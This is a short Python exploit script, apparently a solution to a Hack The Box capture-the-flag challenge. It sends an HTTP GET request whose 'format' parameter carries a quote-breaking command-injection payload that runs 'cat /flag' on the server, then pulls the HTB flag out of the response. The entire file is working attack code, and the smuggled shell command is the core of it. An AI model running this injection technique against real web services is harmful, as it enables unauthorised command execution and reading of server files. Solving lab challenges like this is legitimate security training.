import sys
import requests
import re

if len(sys.argv) != 2:
    print("Usage: python3 exploit.py ip:port")
    sys.exit(1)

host = sys.argv[1]
url = f"http://{host}/"

# Payload triggers command injection
params = {
    'format': "'; cat /flag || '"
}

try:
    r = requests.get(url, params=params, timeout=5)
    flag = re.search(r"HTB\{.*?\}", r.text)

    if flag:
        print("Flag:", flag.group(0))
    else:
        print("Flag not found.")
except Exception as e:
    print(f"Exploit failed: {e}")
    sys.exit(1)
